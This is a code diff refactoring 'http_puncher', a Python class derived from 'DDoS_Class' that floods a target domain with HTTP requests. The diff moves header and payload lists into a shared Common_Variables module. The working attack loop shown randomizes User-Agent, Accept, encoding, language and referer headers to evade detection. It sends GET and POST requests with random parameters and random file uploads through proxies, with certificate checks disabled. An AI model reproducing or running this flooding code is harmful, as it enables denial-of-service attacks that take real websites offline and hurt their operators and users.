@@ -23,7 +23,7 @@ class http_puncher(DDoS_Class):
         self.cookie = cookie
         self.user_agents = user_agents
         if not self.user_agents or len(self.user_agents) == 0:
-            self.user_agents = ua
+            self.user_agents = Common_Variables.user_agents_list
         self.method = method
         self.send_files=send_files
         self.stop = False
@@ -65,40 +65,40 @@ class http_puncher(DDoS_Class):
                     break
                 try:
                     req_session=requests.Session()
-                    headers={'User-Agent':random.choice(ua)}
+                    headers={'User-Agent':random.choice(Common_Variables.user_agents_list)}
                     headers.update({"Host":self.domain})
                     for l in range(random.randint(1, 5)):
-                        ed = random.choice(ec)
+                        ed = random.choice(Common_Variables.accept_encoding_list)
                         oi = random.randint(1, 3)
                         if oi == 2:
                             gy = 0
                             while gy < 1:
-                                df = random.choice(ec)
+                                df = random.choice(Common_Variables.accept_encoding_list)
                                 if df != ed:
                                     gy += 1
                             ed += ", "
                             ed += df
-                    l = random.choice(al)
+                    l = random.choice(Common_Variables.accept_language_list)
                     for n in range(random.randint(0, 5)):
-                        l += ";q={},".format(round(random.uniform(0.1, 1), 1)) + random.choice(al)
+                        l += ";q={},".format(round(random.uniform(0.1, 1), 1)) + random.choice(Common_Variables.accept_language_list)
                     kl = random.randint(1, 2)
                     if random.randint(0,1)==1:
-                        headers.update({'Accept':random.choice(a)})
+                        headers.update({'Accept':random.choice(Common_Variables.accept_list)})
                     if random.randint(0,1)==1:
-                        headers.update({'Accept-Language':random.choice(al)})
+                        headers.update({'Accept-Language':random.choice(l)})
                     if random.randint(0,1)==1:
                         headers.update({'Accept-Encoding':ed})
                     if random.randint(0,1)==1:
-                        headers.update({'Accept-Charset':random.choice(ac)})
+                        headers.update({'Accept-Charset':random.choice(Common_Variables.accept_charset_list)})
                     if random.randint(0,1)==1:
                         headers.update({'Connection':'Keep-Alive'})
                         headers.update({'Keep-Alive':str(random.randint(100,1000))})
                     else:
                         headers.update({'Connection':'Close'})
                     if random.randint(0,1)==1:
-                        headers.update({'Cache-Control':random.choice(cc)})
+                        headers.update({'Cache-Control':random.choice(Common_Variables.cache_control_list)})
                     if random.randint(0,1)==1:
-                        s=referers+self.urls
+                        s=Common_Variables.referers_list+self.urls
                         headers.update({'Referer':random.choice(s)})
                     header_keys = list(headers.keys())
                     random.shuffle(header_keys)
@@ -126,18 +126,18 @@ class http_puncher(DDoS_Class):
                             files_count=random.randint(0,3)
                             for x in range(files_count):
                                 parameter_name_len=random.randint(1,15)
-                                parameter_name=''.join([random.choice(lis) for x in range(parameter_name_len)])
+                                parameter_name=''.join([random.choice(Common_Variables.source_string) for x in range(parameter_name_len)])
                                 file_name_len=random.randint(1,15)
-                                file_name=''.join([random.choice(lis) for x in range(file_name_len)])+'.'+random.choice(list(files_upload.keys()))
+                                file_name=''.join([random.choice(Common_Variables.source_string) for x in range(file_name_len)])+'.'+random.choice(list(Common_Variables.files_upload.keys()))
                                 file_content_len=random.randint(1,10240)
-                                file_content=''.join([random.choice(lis) for x in range(file_content_len)])+'.'+random.choice(list(files_upload.keys()))
+                                file_content=''.join([random.choice(Common_Variables.source_string) for x in range(file_content_len)])+'.'+random.choice(list(Common_Variables.files_upload.keys()))
                                 files.update({parameter_name:(file_name,file_content)})
                         params_count=random.randint(0,5)
                         for x in range(params_count):
                             key_len=random.randint(0,15)
-                            key=''.join([random.choice(lis) for x in range(key_len)])
+                            key=''.join([random.choice(Common_Variables.source_string) for x in range(key_len)])
                             val_len=random.randint(0,100)
-                            val=''.join([random.choice(lis) for x in range(val_len)])
+                            val=''.join([random.choice(Common_Variables.source_string) for x in range(val_len)])
                             data.update({key:val})
                         if files=={}:
                             files=None
@@ -158,9 +158,9 @@ class http_puncher(DDoS_Class):
                         params_count=random.randint(1,8)
                         for x in range(params_count):
                             key_len=random.randint(1,8)
-                            key=''.join([random.choice(lis) for x in range(key_len)])
+                            key=''.join([random.choice(Common_Variables.source_string) for x in range(key_len)])
                             val_len=random.randint(0,32)
-                            val=''.join([random.choice(lis) for x in range(val_len)])
+                            val=''.join([random.choice(Common_Variables.source_string) for x in range(val_len)])
                             prm.update({key:val})
                         req_session.get(url,params=prm,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                     self.counter+=1
